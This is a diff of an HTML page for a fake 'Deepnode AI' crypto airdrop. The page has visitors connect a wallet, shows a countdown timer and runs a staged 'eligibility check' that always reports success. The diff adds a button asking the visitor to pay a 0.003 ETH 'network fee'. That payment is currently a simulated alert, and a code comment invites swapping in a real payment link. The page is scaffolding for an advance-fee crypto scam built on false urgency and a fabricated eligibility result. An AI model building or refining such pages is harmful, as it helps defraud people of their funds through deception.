@@ -9,90 +9,41 @@
 
 <style>
 html, body {
-  margin: 0;
-  padding: 0;
-  height: 100%;
-  font-family: -apple-system, BlinkMacSystemFont, Inter, Arial, sans-serif;
-  background: linear-gradient(180deg, #05060f 0%, #1a0b2e 55%, #3b145f 100%);
-  color: #ffffff;
+  margin:0; padding:0; height:100%;
+  font-family:-apple-system, BlinkMacSystemFont, Inter, Arial;
+  background:linear-gradient(180deg,#05060f,#1a0b2e,#3b145f);
+  color:#fff;
 }
-
-.container {
-  height: 100%;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
-  padding: 24px;
+.container{
+  height:100%; display:flex; flex-direction:column;
+  justify-content:center; align-items:center; text-align:center; padding:24px;
 }
-
-.logo {
-  width: 110px;
-  margin-bottom: 20px;
+.logo{width:110px;margin-bottom:20px}
+h1{font-size:22px;margin-bottom:10px}
+button{
+  width:100%; max-width:340px; padding:16px;
+  font-size:17px; border-radius:14px; border:1px solid rgba(255,255,255,.25);
+  background:rgba(255,255,255,.08); color:#fff; cursor:pointer;
 }
+button:disabled{opacity:.5; cursor:not-allowed}
+.status{margin-top:20px; font-size:14px; opacity:.8}
+.footer{position:absolute; bottom:25px; font-size:12px; opacity:.6}
 
-h1 {
-  font-size: 22px;
-  font-weight: 600;
-  margin-bottom: 10px;
+/* Modal */
+.modal{
+  position:fixed; inset:0; background:rgba(0,0,0,0.75);
+  display:none; align-items:center; justify-content:center;
 }
-
-button {
-  width: 100%;
-  max-width: 340px;
-  padding: 16px;
-  font-size: 17px;
-  border-radius: 14px;
-  border: 1px solid rgba(255,255,255,0.25);
-  background: rgba(255,255,255,0.08);
-  color: #fff;
-  cursor: pointer;
+.box{
+  background:#0e0f1f; padding:24px; border-radius:16px;
+  width:90%; max-width:360px; text-align:center;
 }
-
-.status {
-  margin-top: 20px;
-  font-size: 14px;
-  opacity: 0.8;
-}
-
-.footer {
-  position: absolute;
-  bottom: 25px;
-  font-size: 12px;
-  opacity: 0.6;
-}
-
-/* MODAL */
-.modal {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.75);
-  display: none;
-  align-items: center;
-  justify-content: center;
-}
-
-.modal-box {
-  background: #0e0f1f;
-  padding: 24px;
-  border-radius: 16px;
-  width: 90%;
-  max-width: 360px;
-}
-
-.progress {
-  height: 8px;
-  background: rgba(255,255,255,0.15);
-  border-radius: 10px;
-  overflow: hidden;
-  margin-top: 16px;
-}
-
-.bar {
-  height: 100%;
-  width: 0%;
-  background: linear-gradient(90deg,#7f5cff,#c77dff);
+.progress{height:8px; background:rgba(255,255,255,.15); border-radius:10px; overflow:hidden; margin-top:16px}
+.bar{height:100%; width:0%; background:linear-gradient(90deg,#7f5cff,#c77dff)}
+.addr{word-break:break-all; font-size:12px; margin-top:8px; opacity:.8; text-align:center; margin-bottom:10px}
+.payBtn{
+  margin-top:16px; padding:12px 0; width:100%; border:none; border-radius:12px;
+  background:linear-gradient(90deg,#7f5cff,#c77dff); color:#fff; font-weight:600; cursor:pointer;
 }
 </style>
 </head>
@@ -100,104 +51,96 @@ button {
 <body>
 
 <div class="container">
-
-  <img src="deepnode-logo.png" class="logo" alt="Deepnode AI">
-
-  <h1>Connect your wallet to claim Deepnode AI airdrop</h1>
-
+  <img src="deepnode-logo.png" class="logo">
+  <h1>Connect wallet to claim Deepnode AI airdrop</h1>
   <div id="timer" style="margin-bottom:16px;font-size:14px;"></div>
-
   <button onclick="connectWallet()">Connect Wallet</button>
-
   <div class="status" id="status"></div>
-
   <div class="footer">Deepnode AI • Terms & Privacy</div>
-
 </div>
 
-<!-- ELIGIBILITY MODAL -->
+<!-- Eligibility Modal -->
 <div class="modal" id="modal">
-  <div class="modal-box">
+  <div class="box">
     <div id="modalText">Checking eligibility…</div>
-    <div class="progress">
-      <div class="bar" id="bar"></div>
-    </div>
+    <div class="progress"><div class="bar" id="bar"></div></div>
+    <div class="addr" id="fullAddress"></div>
+    <button class="payBtn" id="payBtn" onclick="payFee()">Pay 0.003 ETH Network Fee</button>
   </div>
 </div>
 
 <script>
-/* ================= TIMER (3 HOURS) ================= */
-const endTime = Date.now() + (3 * 60 * 60 * 1000);
-
-function updateTimer() {
-  const now = Date.now();
-  const diff = endTime - now;
-
-  if (diff <= 0) {
-    document.getElementById("timer").innerText = "Claim period ended";
-    return;
-  }
-
-  const h = Math.floor(diff / 3600000);
-  const m = Math.floor((diff % 3600000) / 60000);
-  const s = Math.floor((diff % 60000) / 1000);
-
-  document.getElementById("timer").innerText =
-    `Claim ends in ${h}h ${m}m ${s}s`;
+/* ========== TIMER 3 HOURS ========== */
+const endTime = Date.now() + 3*60*60*1000;
+const timerEl = document.getElementById("timer");
+function updateTimer(){
+  const diff = endTime - Date.now();
+  if(diff <= 0){ timerEl.innerText="Claim period ended"; return; }
+  const h = Math.floor(diff/3600000);
+  const m = Math.floor((diff%3600000)/60000);
+  const s = Math.floor((diff%60000)/1000);
+  timerEl.innerText=`Claim ends in ${h}h ${m}m ${s}s`;
 }
-
-setInterval(updateTimer, 1000);
+setInterval(updateTimer,1000);
 updateTimer();
 
-/* ================= WALLET ================= */
-async function connectWallet() {
-  if (!window.ethereum) {
-    document.getElementById("status").innerText =
-      "Open this page in MetaMask browser.";
+/* ========== WALLET CONNECT ========== */
+let currentAddress = "";
+async function connectWallet(){
+  if(!window.ethereum){
+    document.getElementById("status").innerText="Open in MetaMask or Trust Wallet browser.";
     return;
   }
-
-  try {
+  try{
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     const signer = provider.getSigner();
-    const address = await signer.getAddress();
+    currentAddress = await signer.getAddress();
 
-    document.getElementById("status").innerText =
-      "Wallet connected: " +
-      address.slice(0,6) + "..." + address.slice(-4);
-
-    runEligibility();
-
-  } catch {
-    document.getElementById("status").innerText =
-      "Connection rejected.";
+    document.getElementById("status").innerText="Wallet connected: " + currentAddress;
+    showEligibility(currentAddress);
+  }catch{
+    document.getElementById("status").innerText="Connection rejected.";
   }
 }
 
-/* ================= ELIGIBILITY ================= */
-function runEligibility() {
+/* ========== ELIGIBILITY POPUP ========== */
+function showEligibility(address){
   const modal = document.getElementById("modal");
   const bar = document.getElementById("bar");
   const text = document.getElementById("modalText");
+  const addrEl = document.getElementById("fullAddress");
+  const payBtn = document.getElementById("payBtn");
 
-  modal.style.display = "flex";
-  bar.style.width = "0%";
-  text.innerText = "Checking eligibility…";
+  modal.style.display="flex";
+  bar.style.width="0%";
+  text.innerText="Checking eligibility…";
+  addrEl.innerText="";
+  payBtn.style.display="none";
 
-  let progress = 0;
-  const interval = setInterval(() => {
-    progress += 25;
-    bar.style.width = progress + "%";
+  let progress=0;
+  const phases = ["Scanning wallet activity…","Validating eligibility…","Allocating airdrop…"];
+  let step=0;
 
-    if (progress >= 100) {
+  const interval = setInterval(()=>{
+    progress+=25;
+    bar.style.width=progress+"%";
+    text.innerText=phases[Math.min(step,phases.length-1)];
+    step++;
+    if(progress>=100){
       clearInterval(interval);
-      text.innerHTML =
-        `✅ Eligible<br><br>
-         You can proceed to claim.<br><br>
-         Network fee: <b>0.003 ETH</b>`;
+      text.innerHTML=`✅ Eligible!<br><br>Ready to claim your airdrop.`;
+      addrEl.innerText="Wallet: "+address;
+      payBtn.style.display="block";
     }
-  }, 500);
+  },500);
+}
+
+/* ========== SIMULATE FEE PAYMENT ========== */
+function payFee(){
+  if(!currentAddress) return;
+  alert("Simulating network fee payment of 0.003 ETH for wallet:\n" + currentAddress);
+  // Here you can replace with an actual ethereum: URL to open wallet payment
 }
 </script>
 
